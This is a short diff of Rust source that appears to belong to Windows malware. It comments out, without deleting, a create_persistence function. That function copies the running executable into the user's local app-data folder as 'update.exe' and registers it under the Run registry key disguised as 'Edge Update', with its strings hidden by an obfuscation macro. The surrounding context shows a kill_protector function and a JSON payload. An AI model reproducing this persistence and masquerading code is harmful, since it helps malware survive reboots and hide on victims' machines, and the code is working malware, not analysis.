@@ -200,19 +200,19 @@ let payload = serde_json::json!({
 
 
 
- pub fn create_persistence() {
-     // cp current exe to Windwows
-     let cur_exe = env::current_exe().unwrap();
-     let dir = env::var(obf!("localappdata")).unwrap();
-
-     let infec_path = format!("{}\\Microsoft\\update.exe", dir);
-     std::fs::copy(cur_exe, &infec_path).unwrap();
-
-     // create registry key using winreg in Software\\Microsoft\\Windows\\CurrentVersion\\Run and val Windows Update
-     let hklm = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
-     let (key, _) = hklm.create_subkey(obf!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).unwrap();
-     key.set_value(obf!("Edge Update"), &infec_path).unwrap();    
- }
+// pub fn create_persistence() {
+//     // cp current exe to Windwows
+//     let cur_exe = env::current_exe().unwrap();
+//     let dir = env::var(obf!("localappdata")).unwrap();
+//
+//     let infec_path = format!("{}\\Microsoft\\update.exe", dir);
+//     std::fs::copy(cur_exe, &infec_path).unwrap();
+//
+//     // create registry key using winreg in Software\\Microsoft\\Windows\\CurrentVersion\\Run and val Windows Update
+//     let hklm = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
+//     let (key, _) = hklm.create_subkey(obf!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).unwrap();
+//     key.set_value(obf!("Edge Update"), &infec_path).unwrap();    
+// }
 
 pub fn kill_protector() {
     let roaming = ROAMING.clone();
